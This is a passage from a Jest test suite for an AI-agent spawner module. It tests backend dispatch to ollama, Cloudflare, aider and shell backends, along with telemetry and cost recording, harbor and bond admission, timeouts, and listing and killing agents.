/**
 * Spawner Module Tests — AI Agent Launcher
 *
 * Tests for createSpawner factory: spawn (dispatch to backends),
 * list (active agents), kill (stop agent), error handling, and cleanup.
 *
 * The spawner is purely in-memory (no SQLite) and uses fetch for PD
 * coordination and the ollama backend. child_process.spawn is used for
 * aider and custom backends.
 */

import { jest } from '@jest/globals';
import { mkdirSync, mkdtempSync, renameSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { dirname, join } from 'node:path';

// ---------------------------------------------------------------------------
// Mock child_process.spawn before importing spawner
// ---------------------------------------------------------------------------

const mockChildProcess = {
  stdout: { on: jest.fn() },
  stderr: { on: jest.fn() },
  on: jest.fn(),
  kill: jest.fn(),
  pid: 12345,
};

jest.unstable_mockModule('node:child_process', () => ({
  spawn: jest.fn(() => mockChildProcess),
  execSync: jest.fn(),
  execFileSync: jest.fn(),
}));

// Import after mocking
const { spawn: cpSpawn } = await import('node:child_process');
const { createSpawner: createSpawnerBase } = await import('../../lib/spawner.js');
const { resolveModel } = await import('../../lib/model-registry.js');
const { captureWorkspaceIdentity } = await import('../../lib/workspace-identity.js');
const TEST_WORKSPACE_IDENTITY = captureWorkspaceIdentity(process.cwd());
if (!TEST_WORKSPACE_IDENTITY) throw new Error('test workspace identity unavailable');
// Note: the worktree-isolation guard is disabled suite-wide in tests/jest.env.js
// (this file tests spawner mechanics, not isolation). See that file for why.

// ---------------------------------------------------------------------------
// Global fetch mock
// ---------------------------------------------------------------------------

const originalFetch = global.fetch;
let mockFetch;

const TEST_TELEMETRY_BYPASS = {
  humanConfirmed: true,
  confirmedBy: 'jest',
  reason: 'Unit test coverage for legacy non-metered spawner paths',
};

function createSpawner(deps = {}) {
  if (deps.enforceTelemetryPolicy === true) {
    return createSpawnerBase({ enforceTranscriptPolicy: false, ...deps });
  }
  return createSpawnerBase({
    ...deps,
    enforceTelemetryPolicy: false,
    enforceTranscriptPolicy: deps.enforceTranscriptPolicy ?? false,
    telemetryBypassApproval: deps.telemetryBypassApproval ?? TEST_TELEMETRY_BYPASS,
  });
}

// Worktree isolation guard (lib/spawner.ts assessSpawnIsolation) refuses any
// spawn whose workdir resolves to a repository MAIN checkout (.git is a
// directory). These tests never pass an explicit workdir, so the guard falls
// back to process.cwd() — which is a worktree on a dev box but the primary
// checkout in CI (/home/runner/work/port-daddy/port-daddy). That made every
// spawn here short-circuit to "Spawn blocked: workdir is a repository main
// checkout" in CI while passing locally. This suite exercises telemetry /
// backend / result-shape logic, NOT the guard — the guard has its own coverage
// in spawner-isolation-guard.test.js — so opt out of layer-2 isolation here for
// a checkout-independent run.
const originalSpawnIsolationOff = process.env.PD_SPAWN_ISOLATION_OFF;
beforeAll(() => {
  process.env.PD_SPAWN_ISOLATION_OFF = '1';
});

beforeEach(() => {
  // These suites assert RAW backend command/arg construction (cmd === 'aider',
  // 'claude', '/bin/sh', 'codex'). The Coast Guard (ADR-0050) now wraps every
  // subprocess backend under `sandbox-exec` BY DEFAULT, which would change the
  // observed cmd/args. We disable it here so these tests stay focused on
  // dispatch; the default-on confinement is covered by spawner-coast-guard.test.js.
  process.env.PD_COAST_GUARD_OFF = '1';
  delete process.env.CLOUDFLARE_ACCOUNT_ID;
  delete process.env.CLOUDFLARE_API_TOKEN;
  mockFetch = jest.fn().mockResolvedValue({
    ok: true,
    status: 200,
    json: async () => ({ success: true, sessionId: 'test-session-123' }),
    text: async () => 'OK',
  });
  global.fetch = mockFetch;

  // Reset child_process mocks
  cpSpawn.mockClear();
  mockChildProcess.stdout.on.mockReset();
  mockChildProcess.stderr.on.mockReset();
  mockChildProcess.on.mockReset();
  mockChildProcess.kill.mockReset();
});

afterAll(() => {
  global.fetch = originalFetch;
  delete process.env.PD_COAST_GUARD_OFF;
  if (originalSpawnIsolationOff === undefined) delete process.env.PD_SPAWN_ISOLATION_OFF;
  else process.env.PD_SPAWN_ISOLATION_OFF = originalSpawnIsolationOff;
});

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

/**
 * Simulate a successful ollama response.
 * The first two fetch calls are PD coordination (/agents, /sugar/begin),
 * the third is the actual ollama call, then /sugar/done.
 */
function setupOllamaFetchMock(response = 'Hello from ollama') {
  mockFetch.mockImplementation(async (url) => {
    // PD coordination calls (fire-and-forget)
    if (typeof url === 'string' && (url.includes('/agents') || url.includes('/sugar'))) {
      return {
        ok: true,
        status: 200,
        json: async () => ({ success: true, sessionId: 'test-session' }),
        text: async () => 'OK',
      };
    }
    // Ollama call
    if (typeof url === 'string' && url.includes('11434')) {
      return {
        ok: true,
        status: 200,
        json: async () => ({
          message: { content: response },
        }),
        text: async () => response,
      };
    }
    // Fallback
    return {
      ok: true,
      status: 200,
      json: async () => ({ success: true }),
      text: async () => 'OK',
    };
  });
}

/**
 * Make the child process emit 'close' on the next tick so the
 * aider/custom promise resolves.
 */
function resolveChildProcess(code = 0, stdout = 'output', stderr = '') {
  mockChildProcess.stdout.on.mockImplementation((event, cb) => {
    if (event === 'data') {
      if (stdout) cb(Buffer.from(stdout));
    }
  });
  mockChildProcess.stderr.on.mockImplementation((event, cb) => {
    if (event === 'data') {
      if (stderr) cb(Buffer.from(stderr));
    }
  });
  mockChildProcess.on.mockImplementation((event, cb) => {
    if (event === 'close') {
      // Resolve on next microtask so the spawner has time to attach listeners
      Promise.resolve().then(() => cb(code));
    }
  });
}

/**
 * Make the child process emit 'error'.
 */
function rejectChildProcess(message = 'spawn failed') {
  mockChildProcess.stdout.on.mockImplementation(() => {});
  mockChildProcess.stderr.on.mockImplementation(() => {});
  mockChildProcess.on.mockImplementation((event, cb) => {
    if (event === 'error') {
      Promise.resolve().then(() => cb(new Error(message)));
    }
  });
}

// =============================================================================
// createSpawner factory
// =============================================================================

describe('createSpawner', () => {
  test('returns object with spawn, list, kill methods', () => {
    const spawner = createSpawner();
    expect(typeof spawner.spawn).toBe('function');
    expect(typeof spawner.list).toBe('function');
    expect(typeof spawner.kill).toBe('function');
  });

  test('accepts empty deps object', () => {
    // Transcript enforcement is mandatory by default (covered in
    // spawner-transcripts.test.js); opt out here to assert the rest of the
    // empty-deps contract.
    expect(() => createSpawnerBase({ enforceTranscriptPolicy: false })).not.toThrow();
  });

  test('defaults telemetry enforcement on when called with no args', async () => {
    const spawner = createSpawnerBase({ enforceTranscriptPolicy: false });
    setupOllamaFetchMock('blocked');

    const result = await spawner.spawn({
      backend: 'ollama',
      task: 'default enforcement',
    });

    expect(result.status).toBe('failed');
    expect(result.error).toContain('cost tracker unavailable under fail-closed telemetry policy');
  });

  test('rejects telemetry opt-out without HITL confirmation', () => {
    expect(() => createSpawnerBase({ enforceTelemetryPolicy: false })).toThrow(/HITL confirmation is required/);
  });

  test('accepts telemetry opt-out only with explicit HITL confirmation data', () => {
    expect(() => createSpawnerBase({
      enforceTelemetryPolicy: false,
      enforceTranscriptPolicy: false,
      telemetryBypassApproval: TEST_TELEMETRY_BYPASS,
    })).not.toThrow();
  });
});

describe('spawn — instrumentation', () => {
  test('bumps counters and records cost on successful spawn', async () => {
    const counters = { bump: jest.fn() };
    const costTracker = { record: jest.fn() };
    const spawner = createSpawner({ counters, costTracker });
    setupOllamaFetchMock('instrumented');

    const result = await spawner.spawn({
      backend: 'ollama',
      task: 'test instrumentation',
      identity: 'myapp:api:test',
    });

    expect(result.status).toBe('completed');
    expect(counters.bump).toHaveBeenCalledWith(
      'spawn.started',
      expect.objectContaining({ backend: 'ollama', model: 'llama3.1:8b', project: 'myapp' })
    );
    expect(counters.bump).toHaveBeenCalledWith(
      'spawn.completed',
      expect.objectContaining({ backend: 'ollama', model: 'llama3.1:8b', project: 'myapp' })
    );
    expect(counters.bump).toHaveBeenCalledWith(
      'spawn.duration_ms',
      expect.objectContaining({ backend: 'ollama', model: 'llama3.1:8b', project: 'myapp' }),
      expect.any(Number)
    );
    expect(costTracker.record).toHaveBeenCalledWith(
      expect.objectContaining({
        backend: 'ollama',
        model: 'llama3.1:8b',
        projectName: 'myapp',
        identity: 'myapp:api:test',
        spawnId: result.agentId,
      })
    );
  });

  test('records resolved projectDir when workdir is provided', async () => {
    const costTracker = { record: jest.fn() };
    const spawner = createSpawner({ costTracker });
    setupOllamaFetchMock('workdir');

    const result = await spawner.spawn({
      backend: 'ollama',
      task: 'resolve workdir',
      identity: 'myapp:api:test',
      workdir: process.cwd(),
    });

    expect(result.status).toBe('completed');
    expect(costTracker.record).toHaveBeenCalledWith(
      expect.objectContaining({
        projectDir: process.cwd(),
        spawnId: result.agentId,
      })
    );
  });

  test('bumps failed counter and records cost on failed spawn', async () => {
    const counters = { bump: jest.fn() };
    const costTracker = { record: jest.fn() };
    const spawner = createSpawner({ counters, costTracker });
    mockFetch.mockImplementation(async (url) => {
      if (typeof url === 'string' && url.includes('11434')) {
        throw new Error('network boom');
      }
      return {
        ok: true,
        status: 200,
        json: async () => ({ success: true }),
        text: async () => 'OK',
      };
    });

    const result = await spawner.spawn({
      backend: 'ollama',
      task: 'fail instrumentation',
      identity: 'myapp:api:test',
    });

    expect(result.status).toBe('failed');
    expect(counters.bump).toHaveBeenCalledWith(
      'spawn.failed',
      expect.objectContaining({ backend: 'ollama', model: 'llama3.1:8b', project: 'myapp' })
    );
    expect(costTracker.record).toHaveBeenCalledWith(
      expect.objectContaining({
        projectName: 'myapp',
        identity: 'myapp:api:test',
        spawnId: result.agentId,
      })
    );
  });
});

describe('spawn — harbor bond admission', () => {
  function makeBondDeps() {
    return {
      bonds: {
        getBudget: jest.fn(() => 1),
        escrow: jest.fn(() => ({ ok: true, id: 42 })),
        markRunning: jest.fn(),
        refund: jest.fn(),
        slash: jest.fn(),
      },
      harbors: {
        get: jest.fn(() => null),
        create: jest.fn(() => ({ success: true, harbor: { name: 'myapp:fleet' } })),
        enter: jest.fn(async () => ({ success: true, harbor: { name: 'myapp:fleet' } })),
        leaveAll: jest.fn(() => 1),
      },
    };
  }

  test('admits spawned agents into the default project harbor before escrow', async () => {
    const { bonds, harbors } = makeBondDeps();
    const spawner = createSpawner({ bonds, harbors });
    setupOllamaFetchMock('harbored');

    const result = await spawner.spawn({
      backend: 'ollama',
      task: 'needs a harbor',
      identity: 'myapp:api:test',
    });

    expect(result.status).toBe('completed');
    expect(harbors.create).toHaveBeenCalledWith(
      'myapp:fleet',
      expect.objectContaining({
        scope: 'myapp',
        capabilities: ['spawn:agent'],
      })
    );
    expect(harbors.enter).toHaveBeenCalledWith(
      'myapp:fleet',
      result.agentId,
      expect.objectContaining({
        identity: 'myapp:api:test',
        capabilities: ['spawn:agent', 'backend:ollama'],
      })
    );
    // Bond is now scope-proportional (lib/bond-pricing.ts), not a flat 0.01:
    // a spawn cap classifies as the `full`/amplifier tier (25×) and the
    // default 5-min timeout is duration 1.0×, so c=0.01 → 0.01×25×1.0 = 0.25.
    // (A caller-supplied spec.bondUsd would still win — back-compat preserved.)
    expect(bonds.escrow).toHaveBeenCalledWith(
      expect.objectContaining({
        project: 'myapp',
        agentId: result.agentId,
        bondUsd: 0.25,
        harborName: 'myapp:fleet',
      })
    );
    expect(harbors.enter.mock.invocationCallOrder[0]).toBeLessThan(
      bonds.escrow.mock.invocationCallOrder[0]
    );
    expect(bonds.refund).toHaveBeenCalledWith(42);
    expect(harbors.leaveAll).toHaveBeenCalledWith(result.agentId);
  });

  test('blocks before escrow when harbor admission fails', async () => {
    const { bonds, harbors } = makeBondDeps();
    harbors.enter.mockResolvedValueOnce({ success: false, error: 'not allowed' });
    const spawner = createSpawner({ bonds, harbors });
    setupOllamaFetchMock('should not run');

    const result = await spawner.spawn({
      backend: 'ollama',
      task: 'blocked by harbor',
      identity: 'myapp:api:test',
    });

    expect(result.status).toBe('failed');
    expect(result.error).toContain("could not enter harbor 'myapp:fleet'");
    expect(bonds.escrow).not.toHaveBeenCalled();
  });

  test('leaves the harbor if bond escrow fails after admission', async () => {
    const { bonds, harbors } = makeBondDeps();
    bonds.escrow.mockReturnValueOnce({ ok: false, reason: 'insufficient-balance' });
    const spawner = createSpawner({ bonds, harbors });

    const result = await spawner.spawn({
      backend: 'ollama',
      task: 'escrow fails after harbor admission',
      identity: 'myapp:api:test',
    });

    const admittedAgentId = harbors.enter.mock.calls[0][1];
    expect(result.status).toBe('failed');
    expect(result.error).toContain('could not escrow');
    expect(harbors.leaveAll).toHaveBeenCalledWith(admittedAgentId);
    expect(bonds.refund).not.toHaveBeenCalled();
    expect(bonds.slash).not.toHaveBeenCalled();
  });
});

// =============================================================================
// spawn — backend dispatch
// =============================================================================

describe('spawn — backend dispatch', () => {
  test('ollama backend calls ollama API at localhost:11434', async () => {
    const spawner = createSpawner();
    setupOllamaFetchMock('Test response from llama');

    const result = await spawner.spawn({
      backend: 'ollama',
      task: 'Explain ports',
    });

    expect(result.status).toBe('completed');
    expect(result.output).toBe('Test response from llama');
    expect(result.error).toBeNull();
    expect(result.backend).toBe('ollama');

    // Verify ollama fetch was called
    const ollamaCalls = mockFetch.mock.calls.filter(
      ([url]) => typeof url === 'string' && url.includes('11434')
    );
    expect(ollamaCalls.length).toBe(1);
    expect(ollamaCalls[0][0]).toBe('http://localhost:11434/api/chat');

    // Verify the request body
    const body = JSON.parse(ollamaCalls[0][1].body);
    expect(body.model).toBe('llama3.1:8b'); // default model
    expect(body.messages[0].content).toBe('Explain ports');
    expect(body.stream).toBe(false);
  });

  test('cloudflare backend calls the Workers AI account endpoint', async () => {
    process.env.CLOUDFLARE_ACCOUNT_ID = 'acct-123';
    process.env.CLOUDFLARE_API_TOKEN = 'token-123';

    mockFetch.mockImplementation(async (url) => {
      if (typeof url === 'string' && url.includes('/ai/run/')) {
        return {
          ok: true,
          status: 200,
          json: async () => ({
            success: true,
            result: { response: 'Cloudflare response' },
          }),
          text: async () => 'Cloudflare response',
        };
      }
      return {
        ok: true,
        status: 200,
        json: async () => ({ success: true, sessionId: 'test-session-123' }),
        text: async () => 'OK',
      };
    });

    const spawner = createSpawner();
    const result = await spawner.spawn({
      backend: 'cloudflare',
      task: 'Explain lighthouses',
    });

    expect(result.status).toBe('completed');
    expect(result.output).toBe('Cloudflare response');

    const cfCall = mockFetch.mock.calls.find(
      ([url]) => typeof url === 'string' && url.includes('api.cloudflare.com/client/v4/accounts/acct-123/ai/run/')
    );
    expect(cfCall).toBeDefined();
    expect(cfCall[1]).toEqual(expect.objectContaining({
      method: 'POST',
      headers: expect.objectContaining({
        Authorization: 'Bearer token-123',
      }),
    }));
  });

  test('ollama backend uses custom model when specified', async () => {
    const spawner = createSpawner();
    setupOllamaFetchMock('response');

    await spawner.spawn({
      backend: 'ollama',
      model: 'mistral:7b',
      task: 'Hello',
    });

    const ollamaCalls = mockFetch.mock.calls.filter(
      ([url]) => typeof url === 'string' && url.includes('11434')
    );
    const body = JSON.parse(ollamaCalls[0][1].body);
    expect(body.model).toBe('mistral:7b');
  });

  test('ollama backend handles HTTP error', async () => {
    const spawner = createSpawner();
    mockFetch.mockImplementation(async (url) => {
      if (typeof url === 'string' && url.includes('11434')) {
        return {
          ok: false,
          status: 500,
          json: async () => ({}),
          text: async () => 'Internal Server Error',
        };
      }
      return {
        ok: true,
        status: 200,
        json: async () => ({ success: true }),
        text: async () => 'OK',
      };
    });

    const result = await spawner.spawn({
      backend: 'ollama',
      task: 'Will fail',
    });

    expect(result.status).toBe('failed');
    expect(result.error).toContain('Ollama HTTP 500');
    expect(result.error).toContain('Internal Server Error');
  });

  test('ollama backend handles network failure', async () => {
    const spawner = createSpawner();
    mockFetch.mockImplementation(async (url) => {
      if (typeof url === 'string' && url.includes('11434')) {
        throw new Error('Connection refused');
      }
      return {
        ok: true,
        status: 200,
        json: async () => ({ success: true }),
        text: async () => 'OK',
      };
    });

    const result = await spawner.spawn({
      backend: 'ollama',
      task: 'No server',
    });

    expect(result.status).toBe('failed');
    expect(result.error).toBe('Connection refused');
  });

  test('custom backend spawns shell command', async () => {
    const spawner = createSpawner();
    resolveChildProcess(0, 'custom output');

    const result = await spawner.spawn({
      backend: 'custom',
      task: 'echo hello',
    });

    expect(result.status).toBe('completed');
    expect(result.output).toContain('custom output');
    expect(result.backend).toBe('custom');
    expect(cpSpawn).toHaveBeenCalledWith(
      '/bin/sh',
      ['-c', 'echo hello'],
      expect.objectContaining({ shell: false })
    );
  });

  test('custom backend with workdir and env', async () => {
    const spawner = createSpawner();
    resolveChildProcess(0, 'ok');

    await spawner.spawn({
      backend: 'custom',
      task: 'ls',
      workdir: process.cwd(),
      env: { FOO: 'bar' },
    });

    expect(cpSpawn).toHaveBeenCalledWith(
      '/bin/sh',
      ['-c', 'ls'],
      expect.objectContaining({
        cwd: process.cwd(),
        shell: false,
      })
    );

    // Verify env includes custom vars
    const spawnCall = cpSpawn.mock.calls[0];
    expect(spawnCall[2].env.FOO).toBe('bar');
  });

  test('custom backend exposes resolved model metadata to wrapper commands', async () => {
    const spawner = createSpawner();
    resolveChildProcess(0, 'ok');

    await spawner.spawn({
      backend: 'custom',
      task: 'echo metadata',
      model: 'custom-mid',
      modelTier: 'mid',
    });

    const spawnCall = cpSpawn.mock.calls[0];
    expect(spawnCall[2].env.PD_MODEL).toBe('custom-mid');
    expect(spawnCall[2].env.PORT_DADDY_MODEL).toBe('custom-mid');
    expect(spawnCall[2].env.PD_MODEL_TIER).toBe('mid');
    expect(spawnCall[2].env.PORT_DADDY_MODEL_TIER).toBe('mid');
  });

  test('custom backend handles non-zero exit code', async () => {
    const spawner = createSpawner();
    resolveChildProcess(1, '', 'command not found');

    const result = await spawner.spawn({
      backend: 'custom',
      task: 'badcmd',
    });

    expect(result.status).toBe('failed');
    expect(result.error).toContain('command not found');
  });

  test('custom backend handles spawn error', async () => {
    const spawner = createSpawner();
    rejectChildProcess('ENOENT');

    const result = await spawner.spawn({
      backend: 'custom',
      task: 'nonexistent-binary',
    });

    expect(result.status).toBe('failed');
    // After runChild refactor (0df9155), error uses opts.cmd ('/bin/sh') not 'command'
    expect(result.error).toContain('Failed to start /bin/sh');
    expect(result.error).toContain('ENOENT');
  });

  test('aider backend spawns aider with correct args', async () => {
    const spawner = createSpawner();
    resolveChildProcess(0, 'aider output');

    const result = await spawner.spawn({
      backend: 'aider',
      task: 'Fix the login bug',
      files: ['src/auth.ts', 'src/login.ts'],
    });

    expect(result.status).toBe('completed');
    expect(result.output).toContain('aider output');
    expect(cpSpawn).toHaveBeenCalledWith(
      'aider',
      ['--yes', '--no-stream', '--model', 'aider', '--message', 'Fix the login bug', 'src/auth.ts', 'src/login.ts'],
      expect.objectContaining({
        detached: true,
        shell: false,
      })
    );
    // No spec.timeout was given, so no hidden wall clock should be applied.
    expect(cpSpawn.mock.calls[0][2]).not.toHaveProperty('timeout');
  });

  test('aider backend honors explicit model selection', async () => {
    const spawner = createSpawner();
    resolveChildProcess(0, 'aider output');

    await spawner.spawn({
      backend: 'aider',
      model: 'gpt-5',
      task: 'Refactor carefully',
    });

    expect(cpSpawn).toHaveBeenCalledWith(
      'aider',
      ['--yes', '--no-stream', '--model', 'gpt-5', '--message', 'Refactor carefully'],
      expect.objectContaining({ detached: true, shell: false })
    );
    expect(cpSpawn.mock.calls[0][2]).not.toHaveProperty('timeout');
  });

  test('aider backend with no files', async () => {
    const spawner = createSpawner();
    resolveChildProcess(0, 'done');

    await spawner.spawn({
      backend: 'aider',
      task: 'General help',
    });

    const args = cpSpawn.mock.calls[0][1];
    expect(args).toEqual(['--yes', '--no-stream', '--model', 'aider', '--message', 'General help']);
  });

  test('does not apply hidden timeout when timeout is not specified', async () => {
    jest.useFakeTimers();
    try {
      const spawner = createSpawner();

      // Child process never emits 'close' on its own — if a hidden default
      // wall clock were still applied, it would be the only thing that ever
      // terminates this spawn.
      mockChildProcess.stdout.on.mockImplementation(() => {});
      mockChildProcess.stderr.on.mockImplementation(() => {});
      let closeCb;
      mockChildProcess.on.mockImplementation((event, cb) => {
        if (event === 'close') closeCb = cb;
      });

      const spawnPromise = spawner.spawn({
        backend: 'custom',
        task: 'long running without timeout',
      });

      // Flush the microtask chain up to the cpSpawn call — no real wait.
      await jest.advanceTimersByTimeAsync(0);

      // Verify spawn was called without a timeout in the child-process options.
      const spawnCall = cpSpawn.mock.calls[0];
      expect(spawnCall[2]).not.toHaveProperty('timeout');

      // Advance well past the old hidden 5-minute (300000ms) default. Nothing
      // should signal the child — there is no wall clock to fire.
      await jest.advanceTimersByTimeAsync(10 * 60 * 1000);
      expect(mockChildProcess.kill).not.toHaveBeenCalled();

      // Let the child exit on its own and confirm no timer/listener is left
      // pending once the spawn settles.
      closeCb(0);
      await spawnPromise;
      expect(jest.getTimerCount()).toBe(0);
    } finally {
      jest.useRealTimers();
    }
  });

  test('treats an explicit zero timeout as no deadline', async () => {
    const spawner = createSpawner();
    resolveChildProcess(0, 'completed without a deadline');

    const result = await spawner.spawn({
      backend: 'custom',
      task: 'zero means no timeout',
      timeout: 0,
    });

    expect(result.status).toBe('completed');
    expect(cpSpawn.mock.calls[0][2]).not.toHaveProperty('timeout');
  });

  test('explicit timeout SIGTERMs then SIGKILLs the child and reports honestly', async () => {
    jest.useFakeTimers();
    try {
      const spawner = createSpawner();

      // Child never exits on its own — only the deadline mechanics should
      // ever signal it.
      mockChildProcess.stdout.on.mockImplementation(() => {});
      mockChildProcess.stderr.on.mockImplementation(() => {});
      let closeCb;
      mockChildProcess.on.mockImplementation((event, cb) => {
        if (event === 'close') closeCb = cb;
      });

      const spawnPromise = spawner.spawn({
        backend: 'custom',
        task: 'sleep forever',
        timeout: 1000,
      });

      // Flush to the cpSpawn call and confirm the caller-supplied deadline is
      // the one actually passed to the child process.
      await jest.advanceTimersByTimeAsync(0);
      expect(cpSpawn.mock.calls[0][2].timeout).toBe(1000);

      // Just shy of the deadline: nothing signaled yet.
      await jest.advanceTimersByTimeAsync(1000 - 25 - 1);
      expect(mockChildProcess.kill).not.toHaveBeenCalled();

      // Cross the deadline: SIGTERM fires first.
      await jest.advanceTimersByTimeAsync(2);
      expect(mockChildProcess.kill).toHaveBeenCalledWith('SIGTERM');
      expect(mockChildProcess.kill).not.toHaveBeenCalledWith('SIGKILL');

      // The child ignores SIGTERM. After the 5s hard-stop grace window, the
      // spawner escalates to SIGKILL.
      await jest.advanceTimersByTimeAsync(5000);
      expect(mockChildProcess.kill).toHaveBeenCalledWith('SIGKILL');

      // Child finally exits (e.g. killed by the OS). The result must report
      // the timeout honestly, and cleanup must not leak any timer.
      closeCb(null);
      const result = await spawnPromise;
      expect(result.status).toBe('failed');
      expect(result.error).toContain('timed out after 1000ms');
      expect(jest.getTimerCount()).toBe(0);
    } finally {
      jest.useRealTimers();
    }
  });

  test('unknown backend returns error', async () => {
    const spawner = createSpawner();

    const result = await spawner.spawn({
      backend: 'nonexistent',
      task: 'hello',
    });

    expect(result.status).toBe('failed');
    expect(result.error).toContain('Unknown backend');
    expect(result.error).toContain('nonexistent');
  });
});

// =============================================================================
// spawn — result shape
// =============================================================================

describe('spawn — result shape', () => {
  test('emits the exact agent identity before backend execution', async () => {
    const onStarted = jest.fn();
    const spawner = createSpawner();
    setupOllamaFetchMock('result');

    const result = await spawner.spawn({
      backend: 'ollama',
      task: 'test live witness',
      onStarted,
    });

    expect(onStarted).toHaveBeenCalledWith(expect.objectContaining({
      agentId: result.agentId,
      transcriptId: null,
      backend: 'ollama',
      model: 'llama3.1:8b',
      startedAt: result.startedAt,
    }));
  });

  test('returns all expected fields on success', async () => {
    const spawner = createSpawner();
    setupOllamaFetchMock('result');

    const result = await spawner.spawn({
      backend: 'ollama',
      task: 'test',
    });

    expect(result).toEqual(
      expect.objectContaining({
        agentId: expect.stringMatching(/^spawned-[a-f0-9]{12}$/),
        backend: 'ollama',
        model: 'llama3.1:8b',
        status: 'completed',
        output: 'result',
        error: null,
        startedAt: expect.any(Number),
        completedAt: expect.any(Number),
      })
    );
    expect(result.completedAt).toBeGreaterThanOrEqual(result.startedAt);
  });

  test('returns all expected fields on failure', async () => {
    const spawner = createSpawner();
    mockFetch.mockImplementation(async (url) => {
      if (typeof url === 'string' && url.includes('11434')) {
        throw new Error('boom');
      }
      return {
        ok: true,
        status: 200,
        json: async () => ({ success: true }),
        text: async () => 'OK',
      };
    });

    const result = await spawner.spawn({
      backend: 'ollama',
      task: 'test',
    });

    expect(result.status).toBe('failed');
    expect(result.error).toBe('boom');
    expect(result.output).toBeNull();
    expect(result.completedAt).toBeTruthy();
  });

  test('uses default model for each backend', async () => {
    const spawner = createSpawner();
    setupOllamaFetchMock('ok');

    const result = await spawner.spawn({
      backend: 'ollama',
      task: 'test',
    });
    expect(result.model).toBe('llama3.1:8b');
  });

  test('uses provided model over default', async () => {
    const spawner = createSpawner();
    setupOllamaFetchMock('ok');

    const result = await spawner.spawn({
      backend: 'ollama',
      model: 'codellama:13b',
      task: 'test',
    });
    expect(result.model).toBe('codellama:13b');
  });

  test('purpose defaults to truncated task when not provided', async () => {
    const spawner = createSpawner();
    setupOllamaFetchMock('ok');

    const longTask = 'A'.repeat(200);
    await spawner.spawn({
      backend: 'ollama',
      task: longTask,
    });

    // Check PD coordination call includes truncated purpose
    const agentCall = mockFetch.mock.calls.find(
      ([url]) => typeof url === 'string' && url.includes('/agents') && !url.includes('heartbeat')
    );
    expect(agentCall).toBeTruthy();
    const body = JSON.parse(agentCall[1].body);
    expect(body.purpose.length).toBe(80);
    expect(body.purpose).toBe(longTask.slice(0, 80));
  });
});

// =============================================================================
// list
// =============================================================================

describe('list', () => {
  test('returns empty array when no agents spawned', () => {
    const spawner = createSpawner();
    expect(spawner.list()).toEqual([]);
  });

  test('returns spawned agent after spawn', async () => {
    const spawner = createSpawner();
    setupOllamaFetchMock('hello');

    const spawnResult = await spawner.spawn({
      backend: 'ollama',
      name: 'API Test Runner',
      task: 'test',
      identity: 'myapp:api:test',
      purpose: 'Testing the spawner',
    });

    expect(spawnResult.name).toBe('API Test Runner');

    const agents = spawner.list();
    expect(agents.length).toBe(1);
    expect(agents[0]).toEqual(
      expect.objectContaining({
        agentId: spawnResult.agentId,
        name: 'API Test Runner',
        backend: 'ollama',
        model: 'llama3.1:8b',
        status: 'completed',
        identity: 'myapp:api:test',
        purpose: 'Testing the spawner',
        startedAt: expect.any(Number),
        completedAt: expect.any(Number),
      })
    );
  });

  test('returns multiple agents', async () => {
    const spawner = createSpawner();
    setupOllamaFetchMock('response');

    await spawner.spawn({ backend: 'ollama', task: 'task 1' });
    await spawner.spawn({ backend: 'ollama', task: 'task 2' });

    const agents = spawner.list();
    expect(agents.length).toBe(2);
    expect(agents[0].agentId).not.toBe(agents[1].agentId);
  });

  test('does not expose internal fields (heartbeatInterval, childProcess)', async () => {
    const spawner = createSpawner();
    setupOllamaFetchMock('response');

    await spawner.spawn({ backend: 'ollama', task: 'test' });

    const agents = spawner.list();
    expect(agents[0]).not.toHaveProperty('heartbeatInterval');
    expect(agents[0]).not.toHaveProperty('childProcess');
  });

  test('does not rewrite a completed spawn when kill arrives late', async () => {
    const spawner = createSpawner();
    setupOllamaFetchMock('response');

    const result = await spawner.spawn({ backend: 'ollama', task: 'test' });
    spawner.kill(result.agentId);

    const agents = spawner.list();
    const completed = agents.find(a => a.agentId === result.agentId);
    expect(completed.status).toBe('completed');
    expect(completed.completedAt).toBeTruthy();
  });
});

// =============================================================================
// kill
// =============================================================================

describe('kill', () => {
  test('marks agent as killed', async () => {
    const spawner = createSpawner();
    mockChildProcess.stdout.on.mockImplementation(() => {});
    mockChildProcess.stderr.on.mockImplementation(() => {});
    mockChildProcess.on.mockImplementation(() => {});
    const pending = spawner.spawn({ backend: 'custom', task: 'sleep 9999' });
    await new Promise(r => setTimeout(r, 10));
    const [running] = spawner.list();
    spawner.kill(running.agentId);

    const agents = spawner.list();
    const agent = agents.find(a => a.agentId === running.agentId);
    expect(agent.status).toBe('killed');
    expect(agent.completedAt).toBeTruthy();
    const closeHandler = mockChildProcess.on.mock.calls.find(([event]) => event === 'close');
    if (closeHandler) closeHandler[1](null);
    await pending;
  });

  test('does not throw for non-existent agent', () => {
    const spawner = createSpawner();
    expect(() => spawner.kill('nonexistent-agent-id')).not.toThrow();
  });

  test('does not throw when called twice', async () => {
    const spawner = createSpawner();
    mockChildProcess.stdout.on.mockImplementation(() => {});
    mockChildProcess.stderr.on.mockImplementation(() => {});
    mockChildProcess.on.mockImplementation(() => {});
    const pending = spawner.spawn({ backend: 'custom', task: 'sleep 9999' });
    await new Promise(r => setTimeout(r, 10));
    const [running] = spawner.list();
    expect(() => spawner.kill(running.agentId)).not.toThrow();
    expect(() => spawner.kill(running.agentId)).not.toThrow();
    const closeHandler = mockChildProcess.on.mock.calls.find(([event]) => event === 'close');
    if (closeHandler) closeHandler[1](null);
    await pending;
  });

  test('calls PD coordination /sugar/done on kill', async () => {
    const spawner = createSpawner();
    mockChildProcess.stdout.on.mockImplementation(() => {});
    mockChildProcess.stderr.on.mockImplementation(() => {});
    mockChildProcess.on.mockImplementation(() => {});
    const pending = spawner.spawn({ backend: 'custom', task: 'sleep 9999' });
    await new Promise(r => setTimeout(r, 10));
    const [running] = spawner.list();
    mockFetch.mockClear();
    spawner.kill(running.agentId);
    const closeHandler = mockChildProcess.on.mock.calls.find(([event]) => event === 'close');
    if (closeHandler) closeHandler[1](null);
    await pending;

    const doneCalls = mockFetch.mock.calls.filter(
      ([url]) => typeof url === 'string' && url.includes('/sugar/done')
    );
    expect(doneCalls.length).toBe(1);
    const body = JSON.parse(doneCalls[0][1].body);
    expect(body.agentId).toBe(running.agentId);
    expect(body.sessionId).toBe('test-session-123');
    expect(body.note).toBe('Killed by spawner');
    expect(body.status).toBe('abandoned');
    expect(body).not.toHaveProperty('skipOriginCheck');
    expect(body).not.toHaveProperty('forceIncomplete');
  });

  test('kills child process while custom backend is still running', async () => {
